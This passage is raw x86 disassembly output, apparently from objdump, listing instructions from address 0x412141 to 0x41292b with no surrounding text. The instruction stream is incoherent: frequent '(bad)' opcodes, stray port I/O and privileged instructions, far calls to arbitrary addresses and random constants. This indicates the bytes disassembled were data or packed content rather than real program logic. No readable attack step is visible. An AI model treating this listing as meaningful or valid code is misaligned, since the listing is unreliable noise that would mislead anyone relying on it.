  412141:	and    ebp,DWORD PTR [edx+0x4af2a5]
  412147:	and    BYTE PTR [ecx],al
  412149:	out    dx,al
  41214a:	inc    eax
  41214b:	popa   
  41214c:	imul   ecx,DWORD PTR [ebx-0x68],0x38
  412150:	mov    al,0x8f
  412152:	inc    edx
  412153:	repz pop edi
  412155:	pop    esi
  412156:	xchg   esp,eax
  412157:	fs fmul QWORD PTR gs:[edi+0x5c]
  41215c:	fcomi  st,st(0)
  41215e:	cld    
  41215f:	xchg   ebx,eax
  412160:	in     eax,dx
  412161:	dec    eax
  412162:	push   ss
  412163:	mov    eax,DWORD PTR [esi-0x3a9594c7]
  412169:	aaa    
  41216a:	mov    cl,BYTE PTR [edx+0x123a08aa]
  412170:	sub    eax,0x2841ea91
  412175:	cld    
  412176:	xchg   ebp,eax
  412177:	(bad)
  41217b:	pop    edx
  41217c:	push   ss
  41217d:	addr16 push 0x28
  412180:	sub    eax,0xad5519ec
  412185:	mov    ch,0xb7
  412187:	adc    DWORD PTR ds:0x3eaca8eb,esp
  41218d:	dec    esp
  41218e:	xchg   ecx,eax
  41218f:	stos   BYTE PTR es:[edi],al
  412190:	adc    eax,ecx
  412192:	push   ds
  412193:	mov    ebx,0x112abda1
  412198:	lods   al,BYTE PTR ds:[esi]
  412199:	bound  edi,QWORD PTR [ebx]
  41219b:	out    dx,al
  41219c:	je     0x4121f4
  41219e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41219f:	stos   DWORD PTR es:[edi],eax
  4121a0:	mov    ch,0xfa
  4121a2:	(bad)  
  4121a3:	mov    ds:0x2a2dd9f0,eax
  4121a8:	adc    edi,DWORD PTR [ebx*4-0x3e0b8c93]
  4121af:	mov    edi,ds
  4121b1:	shl    BYTE PTR [edi+0x4bb92bfb],0xc1
  4121b8:	dec    eax
  4121b9:	lock into 
  4121bb:	and    BYTE PTR [edi],al
  4121bd:	scas   eax,DWORD PTR es:[edi]
  4121be:	xchg   edi,eax
  4121bf:	call   0xdea7da6a
  4121c4:	push   es
  4121c5:	xchg   ecx,eax
  4121c6:	stc    
  4121c7:	lahf   
  4121c8:	mov    cl,0x5d
  4121ca:	shr    DWORD PTR ds:0x505e2fdc,cl
  4121d0:	jp     0x41217a
  4121d2:	mov    al,ds:0x62b93db8
  4121d7:	mov    eax,0x17132a2a
  4121dc:	xchg   ebx,eax
  4121dd:	ins    BYTE PTR es:[edi],dx
  4121de:	push   esi
  4121df:	mov    ds:0x1f7a8d02,al
  4121e4:	sbb    BYTE PTR [eax+0x13000ced],ah
  4121ea:	or     al,BYTE PTR [edi-0x32]
  4121ed:	std    
  4121ee:	icebp  
  4121ef:	sub    BYTE PTR [edx-0x1331f885],al
  4121f5:	ror    ecx,1
  4121f7:	mov    eax,0x1d804de3
  4121fc:	int    0xe2
  4121fe:	dec    esp
  4121ff:	inc    ecx
  412200:	shl    DWORD PTR [esi-0x7e],cl
  412203:	ds mov eax,0xbc81b6c
  412209:	enter  0xa71b,0xbc
  41220d:	faddp  st(5),st
  41220f:	xchg   DWORD PTR [edx],ecx
  412211:	jmp    0x31eceab1
  412216:	out    0xac,al
  412218:	bound  ebp,QWORD PTR [ebp-0x587672f0]
  41221e:	loope  0x412287
  412220:	(bad)  [ecx-0x1e1d6e23]
  412226:	fnstsw WORD PTR [ecx+0x4f]
  412229:	inc    eax
  41222a:	pop    esp
  41222c:	cs ins DWORD PTR es:[edi],dx
  41222e:	or     BYTE PTR [edi-0x31ee49d9],0x41
  412235:	xor    BYTE PTR [edx-0x4e],ah
  412238:	mov    ds:0xe4960186,al
  41223d:	pop    ss
  41223e:	std    
  41223f:	lahf   
  412240:	xchg   ebp,eax
  412241:	out    0xdf,eax
  412243:	in     eax,0x8a
  412245:	add    DWORD PTR [esi],esp
  412247:	sub    DWORD PTR [esi+0x2a39ed5d],0x4d1e5284
  412251:	adc    al,0x30
  412253:	arpl   WORD PTR [ebx+ecx*2],dx
  412256:	pop    edi
  412257:	sbb    ebx,DWORD PTR [esi+0x34]
  41225a:	scas   eax,DWORD PTR es:[edi]
  41225b:	lahf   
  41225c:	imul   ebx,DWORD PTR [edx-0x75],0x75ff45ab
  412263:	mov    esi,0x24c017df
  412268:	push   ebp
  412269:	jp     0x412258
  41226b:	xor    DWORD PTR [ecx-0x5f082126],ebx
  412271:	shl    DWORD PTR [esi+0x4d],cl
  412274:	sub    al,0xc8
  412276:	out    0xd8,eax
  412278:	push   ebp
  412279:	ret    0x335a
  41227c:	mov    BYTE PTR [esi-0x7eb31748],dh
  412282:	lock mov ebx,0x4f2143f2
  412288:	fwait
  412289:	push   0x247b9e65
  41228e:	or     DWORD PTR [ebp+0xe3835ae],edi
  412294:	sahf   
  412295:	es ret 0x4379
  412299:	pop    edi
  41229a:	ss lahf 
  41229c:	cli    
  41229d:	cdq    
  41229e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41229f:	dec    esp
  4122a0:	mov    ebp,0x13487e0
  4122a5:	and    ebx,ecx
  4122a7:	fwait
  4122a8:	int    0x40
  4122aa:	adc    ah,0x60
  4122ad:	sbb    DWORD PTR ds:0x58a81956,eax
  4122b3:	xor    al,0xec
  4122b5:	and    eax,0xe97769be
  4122ba:	jmp    0x4122bf
  4122bc:	in     eax,0xcb
  4122be:	dec    edi
  4122bf:	xlat   BYTE PTR ds:[ebx]
  4122c0:	jno    0x4122b1
  4122c2:	scas   eax,DWORD PTR es:[edi]
  4122c3:	cmp    ebp,esp
  4122c5:	jb     0x412255
  4122c7:	push   ds
  4122c8:	inc    esp
  4122c9:	xor    ebp,DWORD PTR [ebp-0x3362cfd9]
  4122cf:	rcr    BYTE PTR [edi],cl
  4122d1:	mov    eax,ds:0x448b9dd1
  4122d6:	ins    BYTE PTR es:[edi],dx
  4122d7:	out    0xca,eax
  4122d9:	nop
  4122da:	lahf   
  4122db:	das    
  4122dc:	mov    ebx,0x9ff92b74
  4122e1:	in     al,dx
  4122e2:	pusha  
  4122e3:	dec    ecx
  4122e4:	add    edx,edi
  4122e6:	fwait
  4122e7:	sbb    dl,BYTE PTR [ecx+0x39]
  4122ea:	lock nop
  4122ec:	clc    
  4122ed:	jb     0x412363
  4122ef:	bound  ebp,QWORD PTR [ebp-0xe]
  4122f2:	sub    dh,bl
  4122f4:	pop    ss
  4122f5:	adc    eax,0x9da8a6bf
  4122fa:	mov    ebx,0x55572e07
  4122ff:	pop    esi
  412300:	repz dec ebx
  412302:	cmp    DWORD PTR [edx-0x75],ebp
  412305:	push   edx
  412306:	pop    ecx
  412307:	push   cs
  412308:	cmp    esp,ebp
  41230a:	sti    
  41230b:	inc    edx
  41230c:	lahf   
  41230d:	add    esp,DWORD PTR [edx]
  41230f:	xchg   ebp,eax
  412310:	xor    eax,0x71
  412313:	inc    ebx
  412314:	in     al,dx
  412315:	jnp    0x41235b
  412317:	mov    ds:0x9ebd9eb3,al
  41231c:	jle    0x41230f
  41231e:	mov    ebx,0x661df200
  412323:	cmp    ch,ah
  412325:	xchg   edx,eax
  412326:	rcl    DWORD PTR [ecx],cl
  412328:	rep ins DWORD PTR es:[edi],dx
  41232a:	dec    esi
  41232b:	xlat   BYTE PTR ds:[ebx]
  41232c:	in     eax,dx
  41232d:	add    BYTE PTR [esi],0x6b
  412330:	test   BYTE PTR [ebp-0x22a8ef70],bl
  412336:	je     0x412353
  412338:	and    al,0xc9
  41233a:	ja     0x41236c
  41233c:	call   0x9363:0x9c93aad7
  412343:	(bad)  
  412344:	dec    edx
  412345:	push   es
  412346:	stos   DWORD PTR es:[edi],eax
  412347:	pop    ds
  412348:	int3   
  412349:	jno    0x412396
  41234b:	icebp  
  41234c:	xchg   esi,eax
  41234d:	xor    DWORD PTR [ecx+0x76c76245],ecx
  412353:	cli    
  412354:	aas    
  412355:	mov    bl,0x6c
  412357:	mov    WORD PTR [eax],es
  412359:	sbb    edi,edx
  41235b:	add    DWORD PTR [ebx-0x7b],0xae596eaf
  412362:	mov    eax,ds:0xc7a52268
  412367:	mov    edi,0x1fd0e86f
  41236c:	icebp  
  41236d:	sub    esi,eax
  41236f:	ret    
  412370:	in     al,dx
  412371:	pop    edi
  412372:	xor    BYTE PTR [ebx],dl
  412374:	shr    ah,cl
  412376:	cmp    BYTE PTR [ecx+0x40ad573f],dh
  41237c:	outs   dx,DWORD PTR ds:[esi]
  41237d:	add    dh,bh
  41237f:	popa   
  412380:	xchg   esp,eax
  412381:	and    ecx,DWORD PTR [esi+0x36]
  412384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412385:	and    BYTE PTR [ecx+esi*8],dh
  412388:	shl    BYTE PTR [edi-0x4c],cl
  41238b:	dec    ebp
  41238c:	ins    DWORD PTR es:[edi],dx
  41238d:	adc    DWORD PTR [edx+edx*4],eax
  412390:	stc    
  412391:	mov    dh,0x3e
  412393:	stos   DWORD PTR es:[edi],eax
  412394:	jae    0x41238c
  412396:	jns    0x41237d
  412398:	pop    es
  412399:	ins    BYTE PTR es:[edi],dx
  41239a:	(bad)  
  41239c:	sub    ebx,edi
  41239e:	cmpxchg esi,edx
  4123a1:	jge    0x412325
  4123a3:	adc    BYTE PTR [edi-0x2bab1496],bh
  4123a9:	jns    0x4123aa
  4123ab:	scas   eax,DWORD PTR es:[edi]
  4123ac:	push   esp
  4123ad:	mov    ecx,0x4eb7460a
  4123b2:	sbb    al,0x8e
  4123b4:	cdq    
  4123b5:	addr16 push edx
  4123b7:	clc    
  4123b8:	xchg   BYTE PTR [ebp+ecx*8-0x52],bl
  4123bc:	pop    esp
  4123bd:	push   eax
  4123be:	sub    dl,dl
  4123c0:	enter  0xf4d1,0x81
  4123c4:	gs sub ah,cl
  4123c7:	rol    BYTE PTR cs:[ebp-0x6f],1
  4123cb:	push   cs
  4123cc:	and    bh,BYTE PTR [edx-0x1d]
  4123cf:	xor    ah,bh
  4123d1:	js     0x4123a4
  4123d3:	sbb    eax,0xf20bdf24
  4123d8:	push   0x20cc562c
  4123dd:	push   ecx
  4123de:	mov    ebx,0x95a4f564
  4123e3:	outs   dx,BYTE PTR ds:[esi]
  4123e4:	sbb    BYTE PTR [esi-0x5],bl
  4123e7:	call   0xcf02:0x4224acb5
  4123ee:	pop    esi
  4123ef:	and    edx,ecx
  4123f1:	(bad)
  4123f5:	fiadd  DWORD PTR [edx+ebp*8]
  4123f8:	out    0xab,al
  4123fa:	shr    cl,1
  4123fc:	adc    al,0x2f
  4123fe:	rcl    edx,1
  412400:	mov    esi,0xe037c6b6
  412405:	push   ebx
  412406:	cwde   
  412407:	and    ebp,ebp
  412409:	mov    bh,dl
  41240b:	xchg   esp,eax
  41240c:	clc    
  41240d:	je     0x412489
  41240f:	jmp    0xcea2:0x25a3af99
  412416:	pop    ds
  412417:	sub    esp,DWORD PTR [esi-0x65]
  41241a:	sub    eax,0x2213aa57
  41241f:	stc    
  412420:	jnp    0x4123ab
  412422:	bound  esp,QWORD PTR [ebp+0x372813f7]
  412428:	or     al,0xd8
  41242a:	and    al,BYTE PTR [esi+0x37095dff]
  412430:	mov    edx,0xf4d54ec3
  412435:	adc    eax,0xa1fa0044
  41243a:	pop    ss
  41243b:	popa   
  41243c:	fidiv  WORD PTR [edx]
  41243e:	add    ebp,ebx
  412440:	add    cl,ah
  412442:	and    DWORD PTR ds:0xc3eee88f,0xffffff9b
  412449:	in     al,0x9a
  41244b:	fnstsw WORD PTR [esi+0x5a]
  41244e:	xor    eax,0x4bab6d7
  412453:	push   esi
  412454:	cmc    
  412455:	jp     0x412402
  412457:	cmp    bh,BYTE PTR [eax]
  412459:	pop    eax
  41245a:	sahf   
  41245b:	mov    edx,0x143cbadb
  412460:	dec    DWORD PTR [ebx-0x24da79f9]
  412466:	sbb    esp,DWORD PTR [eax]
  412468:	inc    esp
  412469:	pop    es
  41246a:	mov    ah,0x83
  41246c:	add    eax,0xa50b1d46
  412471:	and    esi,DWORD PTR [ebp+0x585e5efa]
  412477:	dec    esp
  412478:	fs inc ecx
  41247a:	inc    esp
  41247b:	mov    bh,BYTE PTR [edx]
  41247d:	scas   eax,DWORD PTR es:[edi]
  41247e:	clc    
  41247f:	pop    eax
  412480:	mov    ch,0x21
  412482:	adc    dl,BYTE PTR [esi]
  412484:	js     0x41248d
  412486:	dec    edi
  412487:	fs in  al,0x13
  41248a:	mov    ?,WORD PTR [edx-0x3b787e8f]
  412490:	add    eax,0xdcfc97b9
  412495:	lods   al,BYTE PTR ds:[esi]
  412496:	sub    eax,ebx
  412498:	mov    eax,ds:0x341921e1
  41249d:	or     DWORD PTR [edi-0x6193dcbb],ebp
  4124a3:	xor    bh,ah
  4124a5:	aam    0xeb
  4124a7:	mov    ah,0x52
  4124a9:	lock dec edi
  4124ab:	jne    0x4124c7
  4124ad:	ins    BYTE PTR es:[edi],dx
  4124ae:	mov    edx,0xcfc385ed
  4124b3:	pop    ecx
  4124b4:	shr    DWORD PTR [ebx],0x10
  4124b7:	sub    eax,0x19a307dc
  4124bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124bd:	mov    esp,0x8090c26d
  4124c2:	arpl   bp,ax
  4124c4:	sbb    eax,0xc6908cfa
  4124c9:	mov    esi,DWORD PTR [ecx-0x6333aff2]
  4124cf:	jmp    0x412547
  4124d1:	xchg   esp,eax
  4124d2:	inc    esi
  4124d3:	cmc    
  4124d4:	lods   eax,DWORD PTR ds:[esi]
  4124d5:	pop    ecx
  4124d6:	cs daa 
  4124d8:	push   0xfffffffe
  4124da:	xor    ch,BYTE PTR [esi+eiz*4+0x6b]
  4124de:	lds    edi,FWORD PTR [ebx-0x370cd51a]
  4124e4:	and    ecx,DWORD PTR [edi+0x28]
  4124e7:	or     ah,cl
  4124e9:	sbb    al,0x31
  4124eb:	mov    esp,0xeb0ad25e
  4124f0:	xchg   ebx,eax
  4124f1:	test   al,0x0
  4124f3:	adc    edi,DWORD PTR [ebx+0x1e03ba76]
  4124f9:	fsub   st(6),st
  4124fb:	out    0x49,al
  4124fd:	inc    ebx
  4124fe:	push   ss
  4124ff:	gs out dx,al
  412501:	dec    ebp
  412502:	ficom  WORD PTR [edx+0x42dbfe1a]
  412508:	lea    esi,[eax+0x57]
  41250b:	aaa    
  41250c:	idiv   al
  41250e:	les    edi,FWORD PTR [esi]
  412510:	jne    0x4e8f3766
  412516:	(bad)  
  412517:	enter  0x5fc1,0xb
  41251b:	jl     0x4124be
  41251d:	jle    0x412530
  41251f:	and    eax,DWORD PTR fs:[ebp-0xbf959c2]
  412526:	jg     0x4124c1
  412528:	in     eax,dx
  412529:	ins    BYTE PTR es:[edi],dx
  41252a:	dec    esi
  41252b:	cli    
  41252c:	adc    bl,al
  41252e:	mov    bl,0xf
  412530:	shl    BYTE PTR [ebx-0x75],cl
  412533:	lods   eax,DWORD PTR ds:[esi]
  412534:	push   eax
  412535:	xor    edi,DWORD PTR [edi]
  412537:	mov    dh,0xc9
  412539:	mov    ch,0x5e
  41253b:	push   ss
  41253c:	mov    esp,DWORD PTR [edi+0x44a8aeb7]
  412542:	out    0x10,al
  412544:	dec    esi
  412545:	les    edx,FWORD PTR [esp+ebx*2-0x46]
  412549:	fild   DWORD PTR [esi+eax*1]
  41254c:	js     0x4125ca
  41254e:	test   dl,bh
  412550:	ret    
  412551:	jecxz  0x41255d
  412553:	mov    ah,0x0
  412555:	mov    ebx,0x3384bbc1
  41255a:	mov    cl,0x5f
  41255c:	daa    
  41255d:	idiv   BYTE PTR [edx+0x4c]
  412560:	ret    
  412561:	or     BYTE PTR [edi],0x1f
  412564:	jg     0x41251a
  412566:	shl    DWORD PTR [ebx],cl
  412568:	xlat   BYTE PTR ds:[ebx]
  412569:	test   eax,0xa2f9aa9
  41256e:	mov    BYTE PTR [ebx],ah
  412570:	neg    DWORD PTR [edi]
  412572:	adc    BYTE PTR [ecx],bh
  412574:	ficom  WORD PTR [edx]
  412576:	lods   eax,DWORD PTR ds:[esi]
  412577:	xchg   edx,eax
  412578:	xchg   ebp,eax
  412579:	loop   0x41257c
  41257b:	aaa    
  41257c:	xchg   edx,eax
  41257d:	inc    ecx
  41257e:	fidiv  DWORD PTR [edx]
  412580:	pop    ss
  412581:	and    al,0x4a
  412583:	inc    ebx
  412584:	or     BYTE PTR [edi],bl
  412586:	mov    ebp,0x2ac45ee8
  41258b:	add    DWORD PTR [edx+esi*1-0xcad7d5f],ebx
  412592:	push   esp
  412593:	add    al,0x6e
  412595:	arpl   WORD PTR ds:0xd787742a,ax
  41259b:	jo     0x412619
  41259d:	cmp    DWORD PTR [esi+eiz*4-0x48f49ee9],edx
  4125a4:	lahf   
  4125a5:	in     eax,0xef
  4125a7:	shl    BYTE PTR [eax+ecx*8+0x5ec60527],1
  4125ae:	popa   
  4125af:	(bad)  
  4125b0:	cld    
  4125b1:	inc    esp
  4125b2:	sti    
  4125b3:	int3   
  4125b4:	mov    ah,0xd0
  4125b6:	or     ah,dl
  4125b8:	cmp    BYTE PTR [eax+0x1b],0x6b
  4125bc:	push   ebp
  4125bd:	imul   esp,DWORD PTR [eax+0x41],0xa092e04a
  4125c4:	mov    dl,0x81
  4125c6:	and    edx,esi
  4125c8:	mov    esi,DWORD PTR [edi+0x589bb3ad]
  4125ce:	adc    BYTE PTR [esi+ebp*8+0x19],al
  4125d2:	xlat   BYTE PTR ds:[ebx]
  4125d3:	ins    BYTE PTR es:[edi],dx
  4125d4:	(bad)
  4125d8:	cmp    al,0x7c
  4125da:	imul   esi,DWORD PTR [edi-0x16030aca],0xcb8b7381
  4125e4:	cmp    DWORD PTR [edx-0x6],ebp
  4125e7:	push   0xb57040d9
  4125ec:	and    DWORD PTR ds:0xef5c3f1c,edx
  4125f2:	xchg   ebp,eax
  4125f3:	jg     0x412581
  4125f5:	mov    BYTE PTR [edi+0x64],ah
  4125f8:	mov    ch,0xf2
  4125fa:	lock int3 
  4125fc:	pop    ebp
  4125fd:	inc    ebp
  4125fe:	nop
  4125ff:	inc    ebx
  412600:	les    edx,FWORD PTR [esi+edx*8+0x36e0b758]
  412607:	and    BYTE PTR [ebp+0x4b],bl
  41260a:	(bad)  
  41260c:	and    BYTE PTR [ecx+0x18d64ef1],0x61
  412613:	lock pop esi
  412615:	lods   al,BYTE PTR ds:[esi]
  412616:	sub    al,0xb9
  412618:	pop    ecx
  412619:	lahf   
  41261a:	imul   esi,DWORD PTR [edx+0x17],0xd280127
  412621:	mov    bh,0x41
  412623:	int    0x67
  412625:	std    
  412626:	adc    BYTE PTR [edi+ebx*2+0x6e],ch
  41262a:	bound  ebp,QWORD PTR [ebp+0x101f8624]
  412630:	sbb    eax,DWORD PTR [ecx-0x6b]
  412633:	dec    ebx
  412634:	loopne 0x4125ee
  412636:	push   0x4d6d2ed7
  41263b:	push   ds
  41263c:	and    BYTE PTR [edx+0x73],0xe1
  412640:	retf   0x1a8f
  412643:	xor    BYTE PTR [eax+0x7e],al
  412646:	addr16 pop ebx
  412648:	mov    ch,0x40
  41264a:	loop   0x4125eb
  41264c:	les    edi,FWORD PTR [esi+0x43]
  41264f:	test   eax,0xd139bac8
  412654:	mov    al,0x41
  412656:	icebp  
  412657:	aam    0xd
  412659:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41265a:	js     0x412639
  41265c:	aad    0x3d
  41265e:	adc    al,dl
  412660:	dec    ebx
  412661:	jle    0x41266d
  412663:	retf   0x4816
  412666:	pop    ss
  412667:	les    esi,FWORD PTR [edx]
  412669:	call   0x8d24:0xe641d2dd
  412670:	dec    edx
  412671:	pop    esi
  412672:	jnp    0x4126a6
  412674:	popf   
  412675:	push   cs
  412676:	cwde   
  412677:	les    ecx,FWORD PTR [eax-0x8]
  41267a:	pop    ebx
  41267b:	jae    0x41260d
  41267d:	pop    ds
  41267e:	inc    esi
  41267f:	sub    BYTE PTR [edx-0x1a9f33c2],ch
  412685:	lock push eax
  412687:	sub    ch,BYTE PTR [ecx-0x5f]
  41268a:	outs   dx,BYTE PTR ds:[esi]
  41268b:	mov    ch,0xfa
  41268d:	arpl   WORD PTR [ebx-0x22],bp
  412690:	repz lds edi,FWORD PTR [eax+0x1f93f9b5]
  412697:	mov    eax,0x60347e0
  41269c:	cmp    BYTE PTR [edi+0x31],0xc5
  4126a0:	jge    0x4126eb
  4126a2:	repnz pop ebp
  4126a4:	mov    bl,0xa2
  4126a6:	repnz inc ebp
  4126a8:	and    esp,DWORD PTR [esi+eiz*1]
  4126ab:	popa   
  4126ac:	and    DWORD PTR [ebp-0x63],0x4
  4126b0:	jns    0x41267f
  4126b2:	add    dh,BYTE PTR [esi+0x197d41aa]
  4126b8:	sbb    bh,BYTE PTR [edx-0x1c]
  4126bb:	jo     0x412727
  4126bd:	call   0x1f46:0x234867fb
  4126c4:	mov    ebp,0x1c367947
  4126c9:	ror    BYTE PTR [ebp+0xb],cl
  4126cc:	(bad)  
  4126cd:	mov    ecx,0x2d41aac4
  4126d2:	add    eax,0xaff74720
  4126d7:	dec    edi
  4126d8:	(bad)  
  4126d9:	xchg   edi,eax
  4126da:	pop    ecx
  4126db:	jns    0x4126b9
  4126dd:	in     al,dx
  4126de:	and    BYTE PTR [edx+0x63],cl
  4126e1:	out    dx,al
  4126e2:	add    cl,BYTE PTR [eax+0x4aa13b50]
  4126e8:	(bad)  
  4126ea:	xchg   BYTE PTR [eax-0x5b],ah
  4126ed:	scas   eax,DWORD PTR es:[edi]
  4126ee:	dec    ebp
  4126ef:	push   ds
  4126f0:	push   esi
  4126f1:	push   0x6
  4126f3:	sub    ebp,eax
  4126f5:	mov    WORD PTR [edi],es
  4126f7:	add    bh,bl
  4126f9:	adc    DWORD PTR [edi],0xd0dbd8dc
  4126ff:	xor    bl,bl
  412701:	dec    edx
  412702:	mov    al,0x28
  412704:	jg     0x412693
  412706:	xlat   BYTE PTR ds:[ebx]
  412707:	scas   al,BYTE PTR es:[edi]
  412708:	shr    DWORD PTR [ecx+0x351e78b9],1
  41270e:	jge    0x41272c
  412710:	ja     0x412716
  412712:	lahf   
  412713:	adc    BYTE PTR [ebx+0x34f78136],ch
  412719:	out    0x57,eax
  41271b:	fidiv  WORD PTR ds:0x9bf5d2ef
  412721:	adc    dh,BYTE PTR [edi-0x1e701b83]
  412727:	mov    edi,0x5459f764
  41272c:	mov    esi,0xc8e0e30c
  412731:	scas   al,BYTE PTR es:[edi]
  412732:	inc    esp
  412733:	(bad)  
  412734:	icebp  
  412735:	jge    0x4126f3
  412737:	gs ret 
  412739:	ror    DWORD PTR [edi-0x23350545],cl
  41273f:	ja     0x4126e5
  412741:	add    al,0xec
  412743:	call   0xfdb3:0xdb92996a
  41274a:	in     eax,0x63
  41274c:	in     eax,dx
  41274d:	mov    edi,0x64bbe8cf
  412752:	dec    eax
  412753:	popa   
  412754:	sub    ebp,DWORD PTR [edi-0x2]
  412757:	test   DWORD PTR [edx],ebp
  412759:	cmp    edx,DWORD PTR [ecx]
  41275b:	imul   edx,DWORD PTR [esi+0x2de12958],0x770a755e
  412765:	cmp    ecx,0xdd2f1c0f
  41276b:	add    BYTE PTR [esi+edx*1],dh
  41276e:	retf   0xc3d6
  412771:	hlt    
  412772:	ror    DWORD PTR [esi+esi*1],cl
  412775:	mov    al,ds:0x9d3037a6
  41277a:	pop    ss
  41277b:	daa    
  41277c:	hlt    
  41277d:	dec    eax
  41277e:	mov    ah,0x7
  412780:	mov    edi,0xa8b6949b
  412785:	retf   0xfec8
  412788:	xchg   esi,eax
  412789:	sub    ah,BYTE PTR [esi+0x1f]
  41278c:	cmp    BYTE PTR [esi],bl
  41278e:	fnstsw WORD PTR [edi+eiz*1-0x4b]
  412792:	mov    ah,0xa5
  412794:	mov    ds:0x882d48a7,al
  412799:	out    dx,eax
  41279a:	add    bl,al
  41279c:	fxam   
  41279e:	fidivr DWORD PTR [ebp-0x7c]
  4127a1:	das    
  4127a2:	and    BYTE PTR fs:[eiz*8+0x239e4397],dh
  4127aa:	ror    BYTE PTR [edx-0x39],0xf4
  4127ae:	add    al,0xad
  4127b0:	mov    ebp,0xc04b4dd3
  4127b5:	xor    eax,0xddf54e0b
  4127ba:	into   
  4127bb:	jecxz  0x41282f
  4127bd:	cmp    eax,0xac69c2c6
  4127c2:	jns    0x412809
  4127c4:	test   al,0x1e
  4127c6:	pop    ebp
  4127c7:	iret   
  4127c8:	aam    0xe9
  4127ca:	add    ebx,ebp
  4127cc:	mov    ch,0x4b
  4127ce:	inc    edi
  4127cf:	in     al,dx
  4127d0:	mov    esp,0x8be9a32e
  4127d5:	push   ds
  4127d6:	cs mov esi,0xfdeaf87d
  4127dc:	inc    ecx
  4127dd:	pop    es
  4127de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127df:	aas    
  4127e0:	imul   edx,DWORD PTR [ebp-0x50],0x5
  4127e4:	adc    bl,BYTE PTR [edi-0x4fd44318]
  4127ea:	sar    BYTE PTR [ecx],cl
  4127ec:	xor    cl,al
  4127ee:	xchg   esp,eax
  4127ef:	int3   
  4127f0:	and    BYTE PTR [eax-0x13],bh
  4127f3:	addr16 dec eax
  4127f5:	add    al,0xd9
  4127f7:	repz scas eax,DWORD PTR es:[edi]
  4127f9:	xchg   DWORD PTR [ebx-0x5],esp
  4127fc:	inc    eax
  4127fd:	setns  BYTE PTR cs:[edi]
  412801:	pop    ecx
  412802:	jae    0x41282d
  412804:	aaa    
  412805:	mov    ebx,0xafd87492
  41280a:	mov    al,ds:0x8f89438d
  41280f:	push   0xc9a2b3cd
  412814:	xchg   ebx,eax
  412815:	and    al,0x13
  412817:	fst    DWORD PTR ds:0xa750fe3
  41281d:	jmp    0xdccd620c
  412822:	sub    ah,dl
  412824:	cmp    al,BYTE PTR [ecx-0x70]
  412827:	ror    BYTE PTR [esi],0x14
  41282a:	mov    al,0xba
  41282c:	jecxz  0x412834
  41282e:	xchg   ebx,eax
  41282f:	sub    bl,ch
  412831:	xor    cl,al
  412833:	mov    BYTE PTR [ecx-0x68],bh
  412836:	add    bh,BYTE PTR [edi-0x297d1f68]
  41283c:	inc    esi
  41283d:	sbb    esp,esi
  41283f:	dec    esi
  412840:	mov    edi,0x42301ba7
  412845:	fidivr WORD PTR [edi+ebp*8-0x2ec6ec7f]
  41284c:	stc    
  41284d:	xchg   edi,eax
  41284e:	iret   
  41284f:	nop
  412850:	pop    edi
  412851:	clc    
  412852:	ret    
  412853:	mov    ds:0x3a837ee5,eax
  412858:	ja     0x4127e0
  41285a:	and    DWORD PTR [edx-0x1e],edx
  41285d:	sar    BYTE PTR [ecx+edx*4],0xff
  412861:	sbb    cl,al
  412863:	scas   eax,DWORD PTR es:[edi]
  412864:	fmul   st,st(3)
  412866:	call   0xa598:0x4b0fcdaa
  41286d:	div    edx
  41286f:	out    0xc6,al
  412871:	fsubr  st(1),st
  412873:	and    bh,BYTE PTR [ebx]
  412875:	dec    esp
  412876:	ja     0x412836
  412878:	icebp  
  412879:	cmp    BYTE PTR [eax-0x26],bl
  41287c:	xor    eax,0xab80d5ce
  412881:	rol    ebp,0xe5
  412884:	adc    ecx,DWORD PTR [edi-0x45c1d4e4]
  41288a:	mov    edx,0xf475b2e9
  41288f:	mov    ds:0xd684d141,eax
  412894:	sub    ecx,DWORD PTR [esi+0x50]
  412897:	cmc    
  412898:	in     eax,dx
  412899:	add    DWORD PTR [ecx+eax*4+0x21],eax
  41289d:	jp     0x4128aa
  41289f:	add    DWORD PTR [esi],ebx
  4128a1:	icebp  
  4128a2:	nop
  4128a3:	das    
  4128a4:	pop    ebx
  4128a5:	or     BYTE PTR [ebx-0x4ffa6f9e],al
  4128ab:	or     DWORD PTR [ecx],esi
  4128ad:	ins    BYTE PTR es:[edi],dx
  4128ae:	imul   esi,DWORD PTR [edx+0x1f],0x15f790fd
  4128b5:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4128b7:	popa   
  4128b8:	(bad)  
  4128b9:	test   eax,0x39c7a9
  4128be:	mov    BYTE PTR [edx+0x5e],dh
  4128c1:	inc    ebp
  4128c2:	stos   BYTE PTR es:[edi],al
  4128c3:	pop    es
  4128c4:	ds hlt 
  4128c6:	inc    ebp
  4128c7:	cdq    
  4128c8:	fxch   st(4)
  4128ca:	mov    fs,WORD PTR [esi+0x714f4662]
  4128d0:	pop    eax
  4128d1:	sbb    eax,ebx
  4128d3:	pop    esp
  4128d4:	in     al,0x15
  4128d6:	mov    edi,0xcd3bb74
  4128db:	aam    0x22
  4128dd:	add    edx,DWORD PTR [eax-0x62]
  4128e0:	mov    DWORD PTR [esi-0x22fa7ca5],ebx
  4128e6:	push   es
  4128e7:	and    eax,0x2b99c814
  4128ec:	rol    BYTE PTR [edx],cl
  4128ee:	cwde   
  4128ef:	leave  
  4128f0:	inc    ecx
  4128f1:	sbb    BYTE PTR [esi+0x48a3c1f5],al
  4128f7:	les    eax,FWORD PTR [edi]
  4128f9:	dec    ebx
  4128fa:	jbe    0x41289a
  4128fc:	dec    ebp
  4128fd:	(bad)  
  4128ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412900:	add    cl,bl
  412902:	sar    BYTE PTR [di],0x91
  412906:	adc    al,0x7e
  412908:	add    al,0x75
  41290a:	in     eax,0xa
  41290c:	lods   al,BYTE PTR ds:[esi]
  41290d:	(bad)  
  41290e:	mov    eax,DWORD PTR [edx-0x4dddd47a]
  412914:	scas   al,BYTE PTR es:[edi]
  412915:	test   al,0xd8
  412917:	mov    eax,ds:0x1ff1105a
  41291c:	ins    BYTE PTR es:[edi],dx
  41291d:	out    0x7f,eax
  41291f:	add    al,BYTE PTR [ebx+eiz*4]
  412922:	gs push esi
  412924:	dec    ecx
  412925:	test   BYTE PTR [esi+0x4bd751d1],bl
  41292b:	push   0x48d8a046
